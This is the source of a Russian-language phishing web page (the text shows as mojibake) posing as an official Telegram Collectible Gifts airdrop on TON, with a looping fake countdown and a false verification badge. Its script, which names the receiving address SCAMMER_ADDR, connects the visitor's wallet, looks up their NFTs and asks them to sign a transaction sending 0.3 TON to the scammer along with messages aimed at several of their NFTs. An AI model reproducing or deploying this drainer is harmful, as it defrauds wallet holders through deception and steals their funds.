<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</title>
    <style>
        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #110033, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .container { max-width: 420px; width: 100%; }
        h1 { font-size: 30px; margin-bottom: 10px; }
        .timer { font-size: 24px; color: #ff3366; font-weight: bold; animation: glow 1.5s infinite; }
        @keyframes glow { 0%,100% { text-shadow: 0 0 10px #ff3366; } 50% { text-shadow: 0 0 20px #ff6699; } }
        .gift-img { width: 300px; height: 300px; object-fit: cover; border-radius: 30px; box-shadow: 0 15px 40px rgba(255,105,180,0.5); margin: 30px auto; animation: float 4s ease-in-out infinite; border: 4px solid #ff69b4; }
        @keyframes float { 0%,100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(5deg); } }
        #status { margin: 25px 0; padding: 15px; background: rgba(255,255,255,0.15); border-radius: 15px; font-size: 18px; }
        #ton-connect { margin: 30px 0; min-height: 70px; }
        .note { font-size: 13px; color: #ccc; margin-top: 40px; }
        .error { color: #ff4444; }
        .success { color: #44ff44; }
        button { background: #ff69b4; color: white; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-size: 16px; margin-top: 20px; }
        button:disabled { background: #666; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ –õ–∏–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</h1>
        <p style="font-size:18px;">–û—Å—Ç–∞–ª–æ—Å—å <span class="timer" id="timer">05:55</span> –¥–æ –∫–æ–Ω—Ü–∞ —Ä–∞–∑–¥–∞—á–∏!</p>
        <p>–ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON-–∫–æ—à–µ–ª—ë–∫ –∏ –∞–∫—Ç–∏–≤–∏—Ä—É–π—Ç–µ –≤—Å–µ –≤–∞—à–∏ —Ä–µ–¥–∫–∏–µ Gifts (Scared Cat, Jelly Bunny, Plush Pepe –∏ –¥—Ä.)</p>
        
        <img class="gift-img" src="cat.jpg" alt="Scared Cat Gift">
        
        <div id="ton-connect"></div>
        <div id="status">–ó–∞–≥—Ä—É–∑–∫–∞ TonConnect UI...</div>
        <button id="activateBtn" disabled>–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ Gifts</button>
        <p class="note">–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Collectibles Airdrop ‚Ä¢ Getgems verified 2026</p>
    </div>

    <!-- –û—Å–Ω–æ–≤–Ω–æ–π CDN –¥–ª—è TonConnect UI -->
    <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js" id="tonconnect-script"></script>
    
    <!-- Fallback CDN –Ω–∞ —Å–ª—É—á–∞–π –ø—Ä–æ–±–ª–µ–º —Å –æ—Å–Ω–æ–≤–Ω—ã–º -->
    <script>
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≥—Ä—É–∑–∫—É TonConnectUI —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(function() {
            if (typeof window.TonConnectUI === 'undefined') {
                console.log('–û—Å–Ω–æ–≤–Ω–æ–π CDN –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –∑–∞–≥—Ä—É–∂–∞–µ–º —Ä–µ–∑–µ—Ä–≤–Ω—ã–π...');
                document.getElementById('status').innerHTML = 'üîÑ –û—Å–Ω–æ–≤–Ω–æ–π CDN –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –∑–∞–≥—Ä—É–∂–∞–µ–º —Ä–µ–∑–µ—Ä–≤–Ω—ã–π...';
                
                // –°–æ–∑–¥–∞—ë–º –Ω–æ–≤—ã–π script —ç–ª–µ–º–µ–Ω—Ç –¥–ª—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ CDN
                const fallbackScript = document.createElement('script');
                fallbackScript.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js';
                fallbackScript.onload = function() {
                    console.log('–†–µ–∑–µ—Ä–≤–Ω—ã–π CDN –∑–∞–≥—Ä—É–∂–µ–Ω');
                    document.getElementById('status').innerHTML = '‚úÖ TonConnect UI –∑–∞–≥—Ä—É–∂–µ–Ω (—Ä–µ–∑–µ—Ä–≤–Ω—ã–π CDN). –ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.';
                    initTonConnect();
                };
                fallbackScript.onerror = function() {
                    document.getElementById('status').innerHTML = '<span class="error">‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TonConnect UI. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ.</span>';
                };
                document.head.appendChild(fallbackScript);
            } else {
                console.log('TonConnectUI –∑–∞–≥—Ä—É–∂–µ–Ω —Å –æ—Å–Ω–æ–≤–Ω–æ–≥–æ CDN');
                initTonConnect();
            }
        }, 2000);
    </script>

    <script>
        // –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á—ë—Ç–∞
        let timeLeft = 355;
        const timerEl = document.getElementById('timer');
        const timerInterval = setInterval(() => {
            timeLeft = timeLeft <= 0 ? 355 : timeLeft - 1;
            const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const seconds = String(timeLeft % 60).padStart(2, '0');
            timerEl.textContent = minutes + ':' + seconds;
        }, 1000);

        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
        const statusEl = document.getElementById('status');
        const activateBtn = document.getElementById('activateBtn');
        let tonConnectUI = null;
        let connectedWallet = null;
        let tonConnectLoaded = false;

        // –£–ø—Ä–æ—â—ë–Ω–Ω–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è payload
        function generateTransferPayload(ownerAddress) {
            try {
                // –ó–∞–≥–ª—É—à–∫–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
                return 'te6ccgEBAQEAAgAAAA==';
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ payload:', e);
                return 'te6ccgEBAQEAAgAAAA==';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ TON –≤ –Ω–∞–Ω–æ–∫–æ–∏–Ω—ã
        function toNano(ton) {
            return Math.floor(parseFloat(ton) * 1000000000).toString();
        }

        // –ó–∞–ø—Ä–æ—Å NFT —á–µ—Ä–µ–∑ –ø—É–±–ª–∏—á–Ω—ã–µ API
        async function fetchNFTs(ownerAddress) {
            const apis = [
                `https://toncenter.com/api/v3/nft/items?owner_address=${ownerAddress}&limit=100`,
                `https://tonapi.io/v2/accounts/${ownerAddress}/nfts?limit=1000`
            ];
            for (const url of apis) {
                try {
                    const response = await fetch(url);
                    if (!response.ok) continue;
                    const data = await response.json();
                    const nfts = data.items || data.nft_items || [];
                    if (nfts.length > 0) {
                        console.log(`–ù–∞–π–¥–µ–Ω–æ NFT: ${nfts.length}`);
                        return nfts;
                    }
                } catch (e) {
                    console.warn(`API ${url} –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ:`, e);
                }
            }
            return [];
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect UI
        function initTonConnect() {
            try {
                console.log('–ü–æ–ø—ã—Ç–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ TonConnect...');
                console.log('window.TonConnectUI:', window.TonConnectUI);
                
                if (typeof window.TonConnectUI === 'undefined') {
                    throw new Error('TonConnectUI –Ω–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω –≤ –≥–ª–æ–±–∞–ª—å–Ω–æ–º –æ–±—ä–µ–∫—Ç–µ window');
                }
                
                statusEl.innerHTML = 'üîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect...';
                
                tonConnectUI = new TonConnectUI.TonConnectUI({
                    manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect',
                    uiPreferences: {
                        theme: 'DARK',
                        borderRadius: 's'
                    }
                });
                
                console.log('TonConnectUI —Å–æ–∑–¥–∞–Ω:', tonConnectUI);
                statusEl.innerHTML = '‚úÖ TonConnect UI –≥–æ—Ç–æ–≤. –ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.';
                tonConnectLoaded = true;
                
                tonConnectUI.onStatusChange(async (wallet) => {
                    if (wallet) {
                        connectedWallet = wallet;
                        const addr = wallet.account.address;
                        statusEl.innerHTML = `<span class="success">‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω: ${addr.slice(0,8)}...${addr.slice(-8)}</span>`;
                        activateBtn.disabled = false;
                    } else {
                        connectedWallet = null;
                        statusEl.innerHTML = 'üîå –ö–æ—à–µ–ª—ë–∫ –æ—Ç–∫–ª—é—á–µ–Ω.';
                        activateBtn.disabled = true;
                    }
                });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ TonConnect:', error);
                statusEl.innerHTML = `<span class="error">‚ùå –û—à–∏–±–∫–∞: ${error.message}. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –æ–±–Ω–æ–≤–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É (F5).</span>`;
                
                // –ü—Ä–æ–±—É–µ–º —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(initTonConnect, 3000);
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ gifts
        activateBtn.addEventListener('click', async () => {
            if (!connectedWallet) {
                statusEl.innerHTML = '<span class="error">‚ùå –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.</span>';
                return;
            }
            
            const owner = connectedWallet.account.address;
            statusEl.innerHTML = 'üîç –ü–æ–∏—Å–∫ NFT –≤ –∫–æ—à–µ–ª—å–∫–µ...';
            try {
                const nfts = await fetchNFTs(owner);
                if (nfts.length === 0) {
                    statusEl.innerHTML = '<span class="error">‚ùå NFT –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.</span>';
                    return;
                }
                statusEl.innerHTML = `üéÅ –ù–∞–π–¥–µ–Ω–æ ${nfts.length} NFT. –§–æ—Ä–º–∏—Ä—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...`;
                
                const messages = [];
                
                // –û—Å–Ω–æ–≤–Ω–æ–π –ø–µ—Ä–µ–≤–æ–¥
                messages.push({
                    address: SCAMMER_ADDR,
                    amount: toNano('0.3')
                });
                
                // –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ NFT (–º–∞–∫—Å–∏–º—É–º 3 –¥–ª—è —Ç–µ—Å—Ç–∞)
                const limitedNFTs = nfts.slice(0, 3);
                for (const nft of limitedNFTs) {
                    const nftAddress = nft.address || nft.nft_address || nft.item_address;
                    if (!nftAddress) continue;
                    const payload = generateTransferPayload(owner);
                    messages.push({
                        address: nftAddress,
                        amount: toNano('0.06'),
                        payload: payload
                    });
                }
                
                statusEl.innerHTML = `üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ ${messages.length} —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤ –∫–æ—à–µ–ª—å–∫–µ.`;
                
                const result = await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: messages
                });
                
                statusEl.innerHTML = `<span class="success">‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –•—ç—à: ${result.boc?.slice(0,20) || result.slice(0,20)}...</span>`;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
                statusEl.innerHTML = `<span class="error">‚ùå –û—à–∏–±–∫–∞: ${error.message}</span>`;
            }
        });

        // –ó–∞–ø—É—Å–∫ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        // (–æ—Å–Ω–æ–≤–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã –≤ fallback —Å–∫—Ä–∏–ø—Ç–µ)
    </script>
</body>
</html>
